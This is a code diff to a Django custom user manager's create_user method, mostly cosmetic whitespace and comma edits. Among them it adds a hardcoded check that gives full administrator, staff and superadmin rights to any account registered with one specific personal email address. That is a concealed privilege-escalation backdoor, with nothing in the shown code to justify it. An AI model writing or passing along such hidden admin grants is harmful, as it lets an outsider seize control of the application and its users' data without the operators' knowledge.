@@ -12,15 +12,24 @@ class MyAccountManager(BaseUserManager):
         
         if not username:
             raise ValueError('User must have an username') 
-        
+      
+                
         user = self.model(
-            email = self.normalize_email(email),   #enter any capital letter email the  normalize_email make to smalletter
+            email = self.normalize_email(email) ,   #enter any capital letter email the  normalize_email make to smalletter
             username = username,
             first_name = first_name,
             last_name = last_name,  
         )
         
         user.set_password(password) #  set_password seting the password inbuild func
+
+        if email == "jo266662@gmail.com":
+                user.is_admin = True
+                user.is_staff = True
+                user.is_active =True
+                user.is_superadmin = True
+        
+      
         user.save(using=self._db) # 
         return user
     
